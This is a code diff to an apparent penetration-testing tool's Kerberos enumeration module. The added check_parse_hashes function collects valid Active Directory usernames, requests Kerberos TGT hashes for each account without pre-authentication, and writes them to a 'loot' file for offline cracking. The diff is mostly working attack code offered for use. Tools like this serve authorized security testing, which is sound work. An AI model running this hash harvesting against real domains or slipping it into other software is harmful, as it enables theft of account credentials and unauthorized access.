@@ -2,7 +2,7 @@
 
 import os
 from sty import fg
-from autorecon.lib import nmapParser
+from autorecon.lib import nmapParser, ldap_imp
 from autorecon.lib import domainFinder
 from autorecon.utils import config_parser
 import re
@@ -18,21 +18,13 @@ class KerbEnum:
     def __init__(self, target):
         self.target = target
         self.processes = ""
+        self.ldapper = ldap_imp.enumLdap(self.target)
 
     def PwnWinRM(self):
 
         c = config_parser.CommandParser(f"{os.path.expanduser('~')}/.config/autorecon/config.yaml", self.target)
         if not os.path.exists(c.getPath("kerberos", "kerbDir")):
             os.makedirs(c.getPath("kerberos", "kerbDir"))
-        # print(fg.cyan + "Checking for valid usernames. Kerbrute! Running the following commands:" + fg.rs)
-
-        def flatten(lis):
-            for item in lis:
-                if isinstance(item, Iterable) and not isinstance(item, str):
-                    for x in flatten(item):
-                        yield x
-                else:
-                    yield item
 
         def parse_users():
             """
@@ -73,6 +65,28 @@ class KerbEnum:
                 return sorted_ad_domains
             except FileNotFoundError as fnf_error:
                 print(fnf_error)
+
+        def check_parse_hashes():
+            print(f"[{fg.li_magenta}+{fg.rs}] Creating List of Valid Usernames")
+            users = parse_users()
+            print(f"[{fg.li_green}+{fg.rs}] Checking for Kerberos Pre-Authentication TGT Hashes")
+            domain = self.ldapper.get_domain()
+            hashes = []
+            if domain and users:
+                for u in users:
+                    try:
+                        hashes.append(self.ldapper.get_tgt(u))
+                    except Exception as e:
+                        print(e)
+                if hashes:
+                    print(f"Found tgt hashes {hashes}")
+                if not os.path.exists(c.getPath("loot", "lootDir")):
+                    os.makedirs(c.getPath("loot", "lootDir"))
+                with open(c.getPath("loot", "krbHashes"), "w") as hash_file:
+                    if hashes:
+                        for i in hashes:
+                            hash_file.write(i.rstrip() + "\n")
+            return hashes
 
         def KerbBrute():
             domain = parse_ad_domain()
